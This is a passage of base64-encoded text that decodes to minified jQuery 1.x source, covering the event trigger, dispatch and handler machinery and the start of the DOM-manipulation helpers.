cGFuZG9dID8gYiA6IG5ldyBtLkV2ZW50KHAsICJvYmplY3QiID09IHR5cGVvZiBiICYmIGIpLCBiLmlzVHJpZ2dlciA9IGUgPyAyIDogMywgYi5uYW1lc3BhY2UgPSBxLmpvaW4oIi4iKSwgYi5uYW1lc3BhY2VfcmUgPSBiLm5hbWVzcGFjZSA/IG5ldyBSZWdFeHAoIihefFxcLikiICsgcS5qb2luKCJcXC4oPzouKlxcLnwpIikgKyAiKFxcLnwkKSIpIDogbnVsbCwgYi5yZXN1bHQgPSB2b2lkIDAsIGIudGFyZ2V0IHx8IChiLnRhcmdldCA9IGQpLCBjID0gbnVsbCA9PSBjID8gW2JdIDogbS5tYWtlQXJyYXkoYywgW2JdKSwgayA9IG0uZXZlbnQuc3BlY2lhbFtwXSB8fCB7fSwgZSB8fCAhay50cmlnZ2VyIHx8IGsudHJpZ2dlci5hcHBseShkLCBjKSAhPT0gITEpKSB7IGlmICghZSAmJiAhay5ub0J1YmJsZSAmJiAhbS5pc1dpbmRvdyhkKSkgeyBmb3IgKGkgPSBrLmRlbGVnYXRlVHlwZSB8fCBwLCAkLnRlc3QoaSArIHApIHx8IChoID0gaC5wYXJlbnROb2RlKSA7IGg7IGggPSBoLnBhcmVudE5vZGUpIG8ucHVzaChoKSwgbCA9IGg7IGwgPT09IChkLm93bmVyRG9jdW1lbnQgfHwgeSkgJiYgby5wdXNoKGwuZGVmYXVsdFZpZXcgfHwgbC5wYXJlbnRXaW5kb3cgfHwgYSkgfSBuID0gMDsgd2hpbGUgKChoID0gb1tuKytdKSAmJiAhYi5pc1Byb3BhZ2F0aW9uU3RvcHBlZCgpKSBiLnR5cGUgPSBuID4gMSA/IGkgOiBrLmJpbmRUeXBlIHx8IHAsIGYgPSAobS5fZGF0YShoLCAiZXZlbnRzIikgfHwge30pW2IudHlwZV0gJiYgbS5fZGF0YShoLCAiaGFuZGxlIiksIGYgJiYgZi5hcHBseShoLCBjKSwgZiA9IGcgJiYgaFtnXSwgZiAmJiBmLmFwcGx5ICYmIG0uYWNjZXB0RGF0YShoKSAmJiAoYi5yZXN1bHQgPSBmLmFwcGx5KGgsIGMpLCBiLnJlc3VsdCA9PT0gITEgJiYgYi5wcmV2ZW50RGVmYXVsdCgpKTsgaWYgKGIudHlwZSA9IHAsICFlICYmICFiLmlzRGVmYXVsdFByZXZlbnRlZCgpICYmICghay5fZGVmYXVsdCB8fCBrLl9kZWZhdWx0LmFwcGx5KG8ucG9wKCksIGMpID09PSAhMSkgJiYgbS5hY2NlcHREYXRhKGQpICYmIGcgJiYgZFtwXSAmJiAhbS5pc1dpbmRvdyhkKSkgeyBsID0gZFtnXSwgbCAmJiAoZFtnXSA9IG51bGwpLCBtLmV2ZW50LnRyaWdnZXJlZCA9IHA7IHRyeSB7IGRbcF0oKSB9IGNhdGNoIChyKSB7IH0gbS5ldmVudC50cmlnZ2VyZWQgPSB2b2lkIDAsIGwgJiYgKGRbZ10gPSBsKSB9IHJldHVybiBiLnJlc3VsdCB9IH0sIGRpc3BhdGNoOiBmdW5jdGlvbiAoYSkgeyBhID0gbS5ldmVudC5maXgoYSk7IHZhciBiLCBjLCBlLCBmLCBnLCBoID0gW10sIGkgPSBkLmNhbGwoYXJndW1lbnRzKSwgaiA9IChtLl9kYXRhKHRoaXMsICJldmVudHMiKSB8fCB7fSlbYS50eXBlXSB8fCBbXSwgayA9IG0uZXZlbnQuc3BlY2lhbFthLnR5cGVdIHx8IHt9OyBpZiAoaVswXSA9IGEsIGEuZGVsZWdhdGVUYXJnZXQgPSB0aGlzLCAhay5wcmVEaXNwYXRjaCB8fCBrLnByZURpc3BhdGNoLmNhbGwodGhpcywgYSkgIT09ICExKSB7IGggPSBtLmV2ZW50LmhhbmRsZXJzLmNhbGwodGhpcywgYSwgaiksIGIgPSAwOyB3aGlsZSAoKGYgPSBoW2IrK10pICYmICFhLmlzUHJvcGFnYXRpb25TdG9wcGVkKCkpIHsgYS5jdXJyZW50VGFyZ2V0ID0gZi5lbGVtLCBnID0gMDsgd2hpbGUgKChlID0gZi5oYW5kbGVyc1tnKytdKSAmJiAhYS5pc0ltbWVkaWF0ZVByb3BhZ2F0aW9uU3RvcHBlZCgpKSAoIWEubmFtZXNwYWNlX3JlIHx8IGEubmFtZXNwYWNlX3JlLnRlc3QoZS5uYW1lc3BhY2UpKSAmJiAoYS5oYW5kbGVPYmogPSBlLCBhLmRhdGEgPSBlLmRhdGEsIGMgPSAoKG0uZXZlbnQuc3BlY2lhbFtlLm9yaWdUeXBlXSB8fCB7fSkuaGFuZGxlIHx8IGUuaGFuZGxlcikuYXBwbHkoZi5lbGVtLCBpKSwgdm9pZCAwICE9PSBjICYmIChhLnJlc3VsdCA9IGMpID09PSAhMSAmJiAoYS5wcmV2ZW50RGVmYXVsdCgpLCBhLnN0b3BQcm9wYWdhdGlvbigpKSkgfSByZXR1cm4gay5wb3N0RGlzcGF0Y2ggJiYgay5wb3N0RGlzcGF0Y2guY2FsbCh0aGlzLCBhKSwgYS5yZXN1bHQgfSB9LCBoYW5kbGVyczogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMsIGQsIGUsIGYsIGcgPSBbXSwgaCA9IGIuZGVsZWdhdGVDb3VudCwgaSA9IGEudGFyZ2V0OyBpZiAoaCAmJiBpLm5vZGVUeXBlICYmICghYS5idXR0b24gfHwgImNsaWNrIiAhPT0gYS50eXBlKSkgZm9yICg7IGkgIT0gdGhpczsgaSA9IGkucGFyZW50Tm9kZSB8fCB0aGlzKSBpZiAoMSA9PT0gaS5ub2RlVHlwZSAmJiAoaS5kaXNhYmxlZCAhPT0gITAgfHwgImNsaWNrIiAhPT0gYS50eXBlKSkgeyBmb3IgKGUgPSBbXSwgZiA9IDA7IGggPiBmOyBmKyspIGQgPSBiW2ZdLCBjID0gZC5zZWxlY3RvciArICIgIiwgdm9pZCAwID09PSBlW2NdICYmIChlW2NdID0gZC5uZWVkc0NvbnRleHQgPyBtKGMsIHRoaXMpLmluZGV4KGkpID49IDAgOiBtLmZpbmQoYywgdGhpcywgbnVsbCwgW2ldKS5sZW5ndGgpLCBlW2NdICYmIGUucHVzaChkKTsgZS5sZW5ndGggJiYgZy5wdXNoKHsgZWxlbTogaSwgaGFuZGxlcnM6IGUgfSkgfSByZXR1cm4gaCA8IGIubGVuZ3RoICYmIGcucHVzaCh7IGVsZW06IHRoaXMsIGhhbmRsZXJzOiBiLnNsaWNlKGgpIH0pLCBnIH0sIGZpeDogZnVuY3Rpb24gKGEpIHsgaWYgKGFbbS5leHBhbmRvXSkgcmV0dXJuIGE7IHZhciBiLCBjLCBkLCBlID0gYS50eXBlLCBmID0gYSwgZyA9IHRoaXMuZml4SG9va3NbZV07IGcgfHwgKHRoaXMuZml4SG9va3NbZV0gPSBnID0gWi50ZXN0KGUpID8gdGhpcy5tb3VzZUhvb2tzIDogWS50ZXN0KGUpID8gdGhpcy5rZXlIb29rcyA6IHt9KSwgZCA9IGcucHJvcHMgPyB0aGlzLnByb3BzLmNvbmNhdChnLnByb3BzKSA6IHRoaXMucHJvcHMsIGEgPSBuZXcgbS5FdmVudChmKSwgYiA9IGQubGVuZ3RoOyB3aGlsZSAoYi0tKSBjID0gZFtiXSwgYVtjXSA9IGZbY107IHJldHVybiBhLnRhcmdldCB8fCAoYS50YXJnZXQgPSBmLnNyY0VsZW1lbnQgfHwgeSksIDMgPT09IGEudGFyZ2V0Lm5vZGVUeXBlICYmIChhLnRhcmdldCA9IGEudGFyZ2V0LnBhcmVudE5vZGUpLCBhLm1ldGFLZXkgPSAhIWEubWV0YUtleSwgZy5maWx0ZXIgPyBnLmZpbHRlcihhLCBmKSA6IGEgfSwgcHJvcHM6ICJhbHRLZXkgYnViYmxlcyBjYW5jZWxhYmxlIGN0cmxLZXkgY3VycmVudFRhcmdldCBldmVudFBoYXNlIG1ldGFLZXkgcmVsYXRlZFRhcmdldCBzaGlmdEtleSB0YXJnZXQgdGltZVN0YW1wIHZpZXcgd2hpY2giLnNwbGl0KCIgIiksIGZpeEhvb2tzOiB7fSwga2V5SG9va3M6IHsgcHJvcHM6ICJjaGFyIGNoYXJDb2RlIGtleSBrZXlDb2RlIi5zcGxpdCgiICIpLCBmaWx0ZXI6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBudWxsID09IGEud2hpY2ggJiYgKGEud2hpY2ggPSBudWxsICE9IGIuY2hhckNvZGUgPyBiLmNoYXJDb2RlIDogYi5rZXlDb2RlKSwgYSB9IH0sIG1vdXNlSG9va3M6IHsgcHJvcHM6ICJidXR0b24gYnV0dG9ucyBjbGllbnRYIGNsaWVudFkgZnJvbUVsZW1lbnQgb2Zmc2V0WCBvZmZzZXRZIHBhZ2VYIHBhZ2VZIHNjcmVlblggc2NyZWVuWSB0b0VsZW1lbnQiLnNwbGl0KCIgIiksIGZpbHRlcjogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMsIGQsIGUsIGYgPSBiLmJ1dHRvbiwgZyA9IGIuZnJvbUVsZW1lbnQ7IHJldHVybiBudWxsID09IGEucGFnZVggJiYgbnVsbCAhPSBiLmNsaWVudFggJiYgKGQgPSBhLnRhcmdldC5vd25lckRvY3VtZW50IHx8IHksIGUgPSBkLmRvY3VtZW50RWxlbWVudCwgYyA9IGQuYm9keSwgYS5wYWdlWCA9IGIuY2xpZW50WCArIChlICYmIGUuc2Nyb2xsTGVmdCB8fCBjICYmIGMuc2Nyb2xsTGVmdCB8fCAwKSAtIChlICYmIGUuY2xpZW50TGVmdCB8fCBjICYmIGMuY2xpZW50TGVmdCB8fCAwKSwgYS5wYWdlWSA9IGIuY2xpZW50WSArIChlICYmIGUuc2Nyb2xsVG9wIHx8IGMgJiYgYy5zY3JvbGxUb3AgfHwgMCkgLSAoZSAmJiBlLmNsaWVudFRvcCB8fCBjICYmIGMuY2xpZW50VG9wIHx8IDApKSwgIWEucmVsYXRlZFRhcmdldCAmJiBnICYmIChhLnJlbGF0ZWRUYXJnZXQgPSBnID09PSBhLnRhcmdldCA/IGIudG9FbGVtZW50IDogZyksIGEud2hpY2ggfHwgdm9pZCAwID09PSBmIHx8IChhLndoaWNoID0gMSAmIGYgPyAxIDogMiAmIGYgPyAzIDogNCAmIGYgPyAyIDogMCksIGEgfSB9LCBzcGVjaWFsOiB7IGxvYWQ6IHsgbm9CdWJibGU6ICEwIH0sIGZvY3VzOiB7IHRyaWdnZXI6IGZ1bmN0aW9uICgpIHsgaWYgKHRoaXMgIT09IGNiKCkgJiYgdGhpcy5mb2N1cykgdHJ5IHsgcmV0dXJuIHRoaXMuZm9jdXMoKSwgITEgfSBjYXRjaCAoYSkgeyB9IH0sIGRlbGVnYXRlVHlwZTogImZvY3VzaW4iIH0sIGJsdXI6IHsgdHJpZ2dlcjogZnVuY3Rpb24gKCkgeyByZXR1cm4gdGhpcyA9PT0gY2IoKSAmJiB0aGlzLmJsdXIgPyAodGhpcy5ibHVyKCksICExKSA6IHZvaWQgMCB9LCBkZWxlZ2F0ZVR5cGU6ICJmb2N1c291dCIgfSwgY2xpY2s6IHsgdHJpZ2dlcjogZnVuY3Rpb24gKCkgeyByZXR1cm4gbS5ub2RlTmFtZSh0aGlzLCAiaW5wdXQiKSAmJiAiY2hlY2tib3giID09PSB0aGlzLnR5cGUgJiYgdGhpcy5jbGljayA/ICh0aGlzLmNsaWNrKCksICExKSA6IHZvaWQgMCB9LCBfZGVmYXVsdDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG0ubm9kZU5hbWUoYS50YXJnZXQsICJhIikgfSB9LCBiZWZvcmV1bmxvYWQ6IHsgcG9zdERpc3BhdGNoOiBmdW5jdGlvbiAoYSkgeyB2b2lkIDAgIT09IGEucmVzdWx0ICYmIGEub3JpZ2luYWxFdmVudCAmJiAoYS5vcmlnaW5hbEV2ZW50LnJldHVyblZhbHVlID0gYS5yZXN1bHQpIH0gfSB9LCBzaW11bGF0ZTogZnVuY3Rpb24gKGEsIGIsIGMsIGQpIHsgdmFyIGUgPSBtLmV4dGVuZChuZXcgbS5FdmVudCwgYywgeyB0eXBlOiBhLCBpc1NpbXVsYXRlZDogITAsIG9yaWdpbmFsRXZlbnQ6IHt9IH0pOyBkID8gbS5ldmVudC50cmlnZ2VyKGUsIG51bGwsIGIpIDogbS5ldmVudC5kaXNwYXRjaC5jYWxsKGIsIGUpLCBlLmlzRGVmYXVsdFByZXZlbnRlZCgpICYmIGMucHJldmVudERlZmF1bHQoKSB9IH0sIG0ucmVtb3ZlRXZlbnQgPSB5LnJlbW92ZUV2ZW50TGlzdGVuZXIgPyBmdW5jdGlvbiAoYSwgYiwgYykgeyBhLnJlbW92ZUV2ZW50TGlzdGVuZXIgJiYgYS5yZW1vdmVFdmVudExpc3RlbmVyKGIsIGMsICExKSB9IDogZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQgPSAib24iICsgYjsgYS5kZXRhY2hFdmVudCAmJiAodHlwZW9mIGFbZF0gPT09IEsgJiYgKGFbZF0gPSBudWxsKSwgYS5kZXRhY2hFdmVudChkLCBjKSkgfSwgbS5FdmVudCA9IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiB0aGlzIGluc3RhbmNlb2YgbS5FdmVudCA/IChhICYmIGEudHlwZSA/ICh0aGlzLm9yaWdpbmFsRXZlbnQgPSBhLCB0aGlzLnR5cGUgPSBhLnR5cGUsIHRoaXMuaXNEZWZhdWx0UHJldmVudGVkID0gYS5kZWZhdWx0UHJldmVudGVkIHx8IHZvaWQgMCA9PT0gYS5kZWZhdWx0UHJldmVudGVkICYmIGEucmV0dXJuVmFsdWUgPT09ICExID8gYWIgOiBiYikgOiB0aGlzLnR5cGUgPSBhLCBiICYmIG0uZXh0ZW5kKHRoaXMsIGIpLCB0aGlzLnRpbWVTdGFtcCA9IGEgJiYgYS50aW1lU3RhbXAgfHwgbS5ub3coKSwgdm9pZCAodGhpc1ttLmV4cGFuZG9dID0gITApKSA6IG5ldyBtLkV2ZW50KGEsIGIpIH0sIG0uRXZlbnQucHJvdG90eXBlID0geyBpc0RlZmF1bHRQcmV2ZW50ZWQ6IGJiLCBpc1Byb3BhZ2F0aW9uU3RvcHBlZDogYmIsIGlzSW1tZWRpYXRlUHJvcGFnYXRpb25TdG9wcGVkOiBiYiwgcHJldmVudERlZmF1bHQ6IGZ1bmN0aW9uICgpIHsgdmFyIGEgPSB0aGlzLm9yaWdpbmFsRXZlbnQ7IHRoaXMuaXNEZWZhdWx0UHJldmVudGVkID0gYWIsIGEgJiYgKGEucHJldmVudERlZmF1bHQgPyBhLnByZXZlbnREZWZhdWx0KCkgOiBhLnJldHVyblZhbHVlID0gITEpIH0sIHN0b3BQcm9wYWdhdGlvbjogZnVuY3Rpb24gKCkgeyB2YXIgYSA9IHRoaXMub3JpZ2luYWxFdmVudDsgdGhpcy5pc1Byb3BhZ2F0aW9uU3RvcHBlZCA9IGFiLCBhICYmIChhLnN0b3BQcm9wYWdhdGlvbiAmJiBhLnN0b3BQcm9wYWdhdGlvbigpLCBhLmNhbmNlbEJ1YmJsZSA9ICEwKSB9LCBzdG9wSW1tZWRpYXRlUHJvcGFnYXRpb246IGZ1bmN0aW9uICgpIHsgdmFyIGEgPSB0aGlzLm9yaWdpbmFsRXZlbnQ7IHRoaXMuaXNJbW1lZGlhdGVQcm9wYWdhdGlvblN0b3BwZWQgPSBhYiwgYSAmJiBhLnN0b3BJbW1lZGlhdGVQcm9wYWdhdGlvbiAmJiBhLnN0b3BJbW1lZGlhdGVQcm9wYWdhdGlvbigpLCB0aGlzLnN0b3BQcm9wYWdhdGlvbigpIH0gfSwgbS5lYWNoKHsgbW91c2VlbnRlcjogIm1vdXNlb3ZlciIsIG1vdXNlbGVhdmU6ICJtb3VzZW91dCIsIHBvaW50ZXJlbnRlcjogInBvaW50ZXJvdmVyIiwgcG9pbnRlcmxlYXZlOiAicG9pbnRlcm91dCIgfSwgZnVuY3Rpb24gKGEsIGIpIHsgbS5ldmVudC5zcGVjaWFsW2FdID0geyBkZWxlZ2F0ZVR5cGU6IGIsIGJpbmRUeXBlOiBiLCBoYW5kbGU6IGZ1bmN0aW9uIChhKSB7IHZhciBjLCBkID0gdGhpcywgZSA9IGEucmVsYXRlZFRhcmdldCwgZiA9IGEuaGFuZGxlT2JqOyByZXR1cm4gKCFlIHx8IGUgIT09IGQgJiYgIW0uY29udGFpbnMoZCwgZSkpICYmIChhLnR5cGUgPSBmLm9yaWdUeXBlLCBjID0gZi5oYW5kbGVyLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyksIGEudHlwZSA9IGIpLCBjIH0gfSB9KSwgay5zdWJtaXRCdWJibGVzIHx8IChtLmV2ZW50LnNwZWNpYWwuc3VibWl0ID0geyBzZXR1cDogZnVuY3Rpb24gKCkgeyByZXR1cm4gbS5ub2RlTmFtZSh0aGlzLCAiZm9ybSIpID8gITEgOiB2b2lkIG0uZXZlbnQuYWRkKHRoaXMsICJjbGljay5fc3VibWl0IGtleXByZXNzLl9zdWJtaXQiLCBmdW5jdGlvbiAoYSkgeyB2YXIgYiA9IGEudGFyZ2V0LCBjID0gbS5ub2RlTmFtZShiLCAiaW5wdXQiKSB8fCBtLm5vZGVOYW1lKGIsICJidXR0b24iKSA/IGIuZm9ybSA6IHZvaWQgMDsgYyAmJiAhbS5fZGF0YShjLCAic3VibWl0QnViYmxlcyIpICYmIChtLmV2ZW50LmFkZChjLCAic3VibWl0Ll9zdWJtaXQiLCBmdW5jdGlvbiAoYSkgeyBhLl9zdWJtaXRfYnViYmxlID0gITAgfSksIG0uX2RhdGEoYywgInN1Ym1pdEJ1YmJsZXMiLCAhMCkpIH0pIH0sIHBvc3REaXNwYXRjaDogZnVuY3Rpb24gKGEpIHsgYS5fc3VibWl0X2J1YmJsZSAmJiAoZGVsZXRlIGEuX3N1Ym1pdF9idWJibGUsIHRoaXMucGFyZW50Tm9kZSAmJiAhYS5pc1RyaWdnZXIgJiYgbS5ldmVudC5zaW11bGF0ZSgic3VibWl0IiwgdGhpcy5wYXJlbnROb2RlLCBhLCAhMCkpIH0sIHRlYXJkb3duOiBmdW5jdGlvbiAoKSB7IHJldHVybiBtLm5vZGVOYW1lKHRoaXMsICJmb3JtIikgPyAhMSA6IHZvaWQgbS5ldmVudC5yZW1vdmUodGhpcywgIi5fc3VibWl0IikgfSB9KSwgay5jaGFuZ2VCdWJibGVzIHx8IChtLmV2ZW50LnNwZWNpYWwuY2hhbmdlID0geyBzZXR1cDogZnVuY3Rpb24gKCkgeyByZXR1cm4gWC50ZXN0KHRoaXMubm9kZU5hbWUpID8gKCgiY2hlY2tib3giID09PSB0aGlzLnR5cGUgfHwgInJhZGlvIiA9PT0gdGhpcy50eXBlKSAmJiAobS5ldmVudC5hZGQodGhpcywgInByb3BlcnR5Y2hhbmdlLl9jaGFuZ2UiLCBmdW5jdGlvbiAoYSkgeyAiY2hlY2tlZCIgPT09IGEub3JpZ2luYWxFdmVudC5wcm9wZXJ0eU5hbWUgJiYgKHRoaXMuX2p1c3RfY2hhbmdlZCA9ICEwKSB9KSwgbS5ldmVudC5hZGQodGhpcywgImNsaWNrLl9jaGFuZ2UiLCBmdW5jdGlvbiAoYSkgeyB0aGlzLl9qdXN0X2NoYW5nZWQgJiYgIWEuaXNUcmlnZ2VyICYmICh0aGlzLl9qdXN0X2NoYW5nZWQgPSAhMSksIG0uZXZlbnQuc2ltdWxhdGUoImNoYW5nZSIsIHRoaXMsIGEsICEwKSB9KSksICExKSA6IHZvaWQgbS5ldmVudC5hZGQodGhpcywgImJlZm9yZWFjdGl2YXRlLl9jaGFuZ2UiLCBmdW5jdGlvbiAoYSkgeyB2YXIgYiA9IGEudGFyZ2V0OyBYLnRlc3QoYi5ub2RlTmFtZSkgJiYgIW0uX2RhdGEoYiwgImNoYW5nZUJ1YmJsZXMiKSAmJiAobS5ldmVudC5hZGQoYiwgImNoYW5nZS5fY2hhbmdlIiwgZnVuY3Rpb24gKGEpIHsgIXRoaXMucGFyZW50Tm9kZSB8fCBhLmlzU2ltdWxhdGVkIHx8IGEuaXNUcmlnZ2VyIHx8IG0uZXZlbnQuc2ltdWxhdGUoImNoYW5nZSIsIHRoaXMucGFyZW50Tm9kZSwgYSwgITApIH0pLCBtLl9kYXRhKGIsICJjaGFuZ2VCdWJibGVzIiwgITApKSB9KSB9LCBoYW5kbGU6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYS50YXJnZXQ7IHJldHVybiB0aGlzICE9PSBiIHx8IGEuaXNTaW11bGF0ZWQgfHwgYS5pc1RyaWdnZXIgfHwgInJhZGlvIiAhPT0gYi50eXBlICYmICJjaGVja2JveCIgIT09IGIudHlwZSA/IGEuaGFuZGxlT2JqLmhhbmRsZXIuYXBwbHkodGhpcywgYXJndW1lbnRzKSA6IHZvaWQgMCB9LCB0ZWFyZG93bjogZnVuY3Rpb24gKCkgeyByZXR1cm4gbS5ldmVudC5yZW1vdmUodGhpcywgIi5fY2hhbmdlIiksICFYLnRlc3QodGhpcy5ub2RlTmFtZSkgfSB9KSwgay5mb2N1c2luQnViYmxlcyB8fCBtLmVhY2goeyBmb2N1czogImZvY3VzaW4iLCBibHVyOiAiZm9jdXNvdXQiIH0sIGZ1bmN0aW9uIChhLCBiKSB7IHZhciBjID0gZnVuY3Rpb24gKGEpIHsgbS5ldmVudC5zaW11bGF0ZShiLCBhLnRhcmdldCwgbS5ldmVudC5maXgoYSksICEwKSB9OyBtLmV2ZW50LnNwZWNpYWxbYl0gPSB7IHNldHVwOiBmdW5jdGlvbiAoKSB7IHZhciBkID0gdGhpcy5vd25lckRvY3VtZW50IHx8IHRoaXMsIGUgPSBtLl9kYXRhKGQsIGIpOyBlIHx8IGQuYWRkRXZlbnRMaXN0ZW5lcihhLCBjLCAhMCksIG0uX2RhdGEoZCwgYiwgKGUgfHwgMCkgKyAxKSB9LCB0ZWFyZG93bjogZnVuY3Rpb24gKCkgeyB2YXIgZCA9IHRoaXMub3duZXJEb2N1bWVudCB8fCB0aGlzLCBlID0gbS5fZGF0YShkLCBiKSAtIDE7IGUgPyBtLl9kYXRhKGQsIGIsIGUpIDogKGQucmVtb3ZlRXZlbnRMaXN0ZW5lcihhLCBjLCAhMCksIG0uX3JlbW92ZURhdGEoZCwgYikpIH0gfSB9KSwgbS5mbi5leHRlbmQoeyBvbjogZnVuY3Rpb24gKGEsIGIsIGMsIGQsIGUpIHsgdmFyIGYsIGc7IGlmICgib2JqZWN0IiA9PSB0eXBlb2YgYSkgeyAic3RyaW5nIiAhPSB0eXBlb2YgYiAmJiAoYyA9IGMgfHwgYiwgYiA9IHZvaWQgMCk7IGZvciAoZiBpbiBhKSB0aGlzLm9uKGYsIGIsIGMsIGFbZl0sIGUpOyByZXR1cm4gdGhpcyB9IGlmIChudWxsID09IGMgJiYgbnVsbCA9PSBkID8gKGQgPSBiLCBjID0gYiA9IHZvaWQgMCkgOiBudWxsID09IGQgJiYgKCJzdHJpbmciID09IHR5cGVvZiBiID8gKGQgPSBjLCBjID0gdm9pZCAwKSA6IChkID0gYywgYyA9IGIsIGIgPSB2b2lkIDApKSwgZCA9PT0gITEpIGQgPSBiYjsgZWxzZSBpZiAoIWQpIHJldHVybiB0aGlzOyByZXR1cm4gMSA9PT0gZSAmJiAoZyA9IGQsIGQgPSBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbSgpLm9mZihhKSwgZy5hcHBseSh0aGlzLCBhcmd1bWVudHMpIH0sIGQuZ3VpZCA9IGcuZ3VpZCB8fCAoZy5ndWlkID0gbS5ndWlkKyspKSwgdGhpcy5lYWNoKGZ1bmN0aW9uICgpIHsgbS5ldmVudC5hZGQodGhpcywgYSwgZCwgYywgYikgfSkgfSwgb25lOiBmdW5jdGlvbiAoYSwgYiwgYywgZCkgeyByZXR1cm4gdGhpcy5vbihhLCBiLCBjLCBkLCAxKSB9LCBvZmY6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHZhciBkLCBlOyBpZiAoYSAmJiBhLnByZXZlbnREZWZhdWx0ICYmIGEuaGFuZGxlT2JqKSByZXR1cm4gZCA9IGEuaGFuZGxlT2JqLCBtKGEuZGVsZWdhdGVUYXJnZXQpLm9mZihkLm5hbWVzcGFjZSA/IGQub3JpZ1R5cGUgKyAiLiIgKyBkLm5hbWVzcGFjZSA6IGQub3JpZ1R5cGUsIGQuc2VsZWN0b3IsIGQuaGFuZGxlciksIHRoaXM7IGlmICgib2JqZWN0IiA9PSB0eXBlb2YgYSkgeyBmb3IgKGUgaW4gYSkgdGhpcy5vZmYoZSwgYiwgYVtlXSk7IHJldHVybiB0aGlzIH0gcmV0dXJuIChiID09PSAhMSB8fCAiZnVuY3Rpb24iID09IHR5cGVvZiBiKSAmJiAoYyA9IGIsIGIgPSB2b2lkIDApLCBjID09PSAhMSAmJiAoYyA9IGJiKSwgdGhpcy5lYWNoKGZ1bmN0aW9uICgpIHsgbS5ldmVudC5yZW1vdmUodGhpcywgYSwgYywgYikgfSkgfSwgdHJpZ2dlcjogZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbiAoKSB7IG0uZXZlbnQudHJpZ2dlcihhLCBiLCB0aGlzKSB9KSB9LCB0cmlnZ2VySGFuZGxlcjogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSB0aGlzWzBdOyByZXR1cm4gYyA/IG0uZXZlbnQudHJpZ2dlcihhLCBiLCBjLCAhMCkgOiB2b2lkIDAgfSB9KTsgZnVuY3Rpb24gZGIoYSkgeyB2YXIgYiA9IGViLnNwbGl0KCJ8IiksIGMgPSBhLmNyZWF0ZURvY3VtZW50RnJhZ21lbnQoKTsgaWYgKGMuY3JlYXRlRWxlbWVudCkgd2hpbGUgKGIubGVuZ3RoKSBjLmNyZWF0ZUVsZW1lbnQoYi5wb3AoKSk7IHJldHVybiBjIH0gdmFyIGViID0gImFiYnJ8YXJ0aWNsZXxhc2lkZXxhdWRpb3xiZGl8Y2FudmFzfGRhdGF8ZGF0YWxpc3R8ZGV0YWlsc3xmaWdjYXB0aW9ufGZpZ3VyZXxmb290ZXJ8aGVhZGVyfGhncm91cHxtYXJrfG1ldGVyfG5hdnxvdXRwdXR8cHJvZ3Jlc3N8c2VjdGlvbnxzdW1tYXJ5fHRpbWV8dmlkZW8iLCBmYiA9IC8galF1ZXJ5XGQrPSIoPzpudWxsfFxkKykiL2csIGdiID0gbmV3IFJlZ0V4cCgiPCg/OiIgKyBlYiArICIpW1xccy8+XSIsICJpIiksIGhiID0gL15ccysvLCBpYiA9IC88KD8hYXJlYXxicnxjb2x8ZW1iZWR8aHJ8aW1nfGlucHV0fGxpbmt8bWV0YXxwYXJhbSkoKFtcdzpdKylbXj5dKilcLz4vZ2ksIGpiID0gLzwoW1x3Ol0rKS8sIGtiID0gLzx0Ym9keS9pLCBsYiA9IC88fCYjP1x3KzsvLCBtYiA9IC88KD86c2NyaXB0fHN0eWxlfGxpbmspL2ksIG5iID0gL2NoZWNrZWRccyooPzpbXj1dfD1ccyouY2hlY2tlZC4pL2ksIG9iID0gL14kfFwvKD86amF2YXxlY21hKXNjcmlwdC9pLCBwYiA9IC9edHJ1ZVwvKC4qKS8sIHFiID0gL15ccyo8ISg/OlxbQ0RBVEFcW3wtLSl8KD86XF1cXXwtLSk+XHMqJC9nLCByYiA9IHsgb3B0aW9uOiBbMSwgIjxzZWxlY3QgbXVsdGlwbGU9J211bHRpcGxlJz4iLCAiPC9zZWxlY3Q+Il0sIGxlZ2VuZDogWzEsICI8ZmllbGRzZXQ+IiwgIjwvZmllbGRzZXQ+Il0sIGFyZWE6IFsxLCAiPG1hcD4iLCAiPC9tYXA+Il0sIHBhcmFtOiBbMSwgIjxvYmplY3Q+IiwgIjwvb2JqZWN0PiJdLCB0aGVhZDogWzEsICI8dGFibGU+IiwgIjwvdGFibGU+Il0sIHRyOiBbMiwgIjx0YWJsZT48dGJvZHk+IiwgIjwvdGJvZHk+PC90YWJsZT4iXSwgY29sOiBbMiwgIjx0YWJsZT48dGJvZHk+PC90Ym9keT48Y29sZ3JvdXA+IiwgIjwvY29sZ3JvdXA+PC90YWJsZT4iXSwgdGQ6IFszLCAiPHRhYmxlPjx0Ym9keT48dHI+IiwgIjwvdHI+PC90Ym9keT48L3RhYmxlPiJdLCBfZGVmYXVsdDogay5odG1sU2VyaWFsaXplID8gWzAsICIiLCAiIl0gOiBbMSwgIlg8ZGl2PiIsICI8L2Rpdj4iXSB9LCBzYiA9IGRiKHkpLCB0YiA9IHNiLmFwcGVuZENoaWxkKHkuY3JlYXRlRWxlbWVudCgiZGl2IikpOyByYi5vcHRncm91cCA9IHJiLm9wdGlvbiwgcmIudGJvZHkgPSByYi50Zm9vdCA9IHJiLmNvbGdyb3VwID0gcmIuY2FwdGlvbiA9IHJiLnRoZWFkLCByYi50aCA9IHJiLnRkOyBmdW5jdGlvbiB1YihhLCBiKSB7IHZhciBjLCBkLCBlID0gMCwgZiA9IHR5cGVvZiBhLmdldEVsZW1lbnRzQnlUYWdOYW1lICE9PSBLID8gYS5nZXRFbGVtZW50c0J5VGFnTmFtZShiIHx8ICIqIikgOiB0eXBlb2YgYS5xdWVyeVNlbGVjdG9yQWxsICE9PSBLID8gYS5xdWVyeVNlbGVjdG9yQWxsKGIgfHwgIioiKSA6IHZvaWQgMDsgaWYgKCFmKSBmb3IgKGYgPSBbXSwgYyA9IGEuY2hpbGROb2RlcyB8fCBhOyBudWxsICE9IChkID0gY1tlXSkgOyBlKyspICFiIHx8IG0ubm9kZU5hbWUoZCwgYikgPyBmLnB1c2goZCkgOiBtLm1lcmdlKGYsIHViKGQsIGIpKTs